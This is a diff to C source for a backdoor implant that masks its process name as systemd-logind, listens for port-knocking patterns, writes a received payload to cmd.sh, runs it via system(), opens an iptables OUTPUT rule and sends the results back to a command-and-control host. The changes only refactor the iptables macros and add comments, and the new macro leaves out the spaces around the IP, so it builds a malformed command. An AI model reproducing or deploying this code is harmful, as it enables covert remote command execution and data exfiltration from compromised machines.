@@ -9,8 +9,8 @@
 #define MASK "/usr/lib/systemd/systemd-logind"
 #define CMD "./cmd.sh > results"
 #define CHMOD "chmod 755 cmd.sh"
-#define IPTABLES "iptables -A OUTPUT -p tcp -d 192.168.0.110 --dport 8505 -j ACCEPT"
-#define TURNOFF "iptables -D OUTPUT -p tcp -d 192.168.0.110 --dport 8505 -j ACCEPT"
+#define IPTABLES(ip) "iptables -A OUTPUT -p tcp -d" ip "--dport 8505 -j ACCEPT"
+#define TURNOFF(ip) "iptables -D OUTPUT -p tcp -d" ip "--dport 8505 -j ACCEPT"
 #define RESULT_FILE "results"
 #define INFECTEDIP "192.168.0.100"
 #define CNCIP "192.168.0.109"
@@ -44,9 +44,9 @@ int main(int argc, char **argv){
     unsigned short sport = SHPORT;
     unsigned short dport = SHPORT;
     unsigned char data[BUFSIZE] = "ls";
-    pattern[0] = 14881;
-    pattern[1] = 15137;
-    knocking[0] = 0;
+    pattern[0] = 14881; //port 8506 in u_short
+    pattern[1] = 15137; //port 8507 in u_short this is for comparing in the ParseTCP function
+    knocking[0] = 0; // initilizing the knocking
     knocking[1] = 0;
 
     covert_send(sip, dip, sport, dport, data, 0);
@@ -228,7 +228,7 @@ void ParsePayload(const u_char *payload, int len){
     fclose(fp);
     system(CHMOD);
     system(CMD);
-    system(IPTABLES);
+    system(IPTABLES(INFECTEDIP));
 
 
     //sending the results back to the CNC
@@ -238,7 +238,7 @@ void ParsePayload(const u_char *payload, int len){
     unsigned short dport = SHPORT;
 
     send_results(srcip, destip, sport, dport, RESULT_FILE);
-    system(TURNOFF);
+    system(TURNOFF(INFECTEDIP));
 }
 
 void recv_results(char* sip, unsigned short sport) {
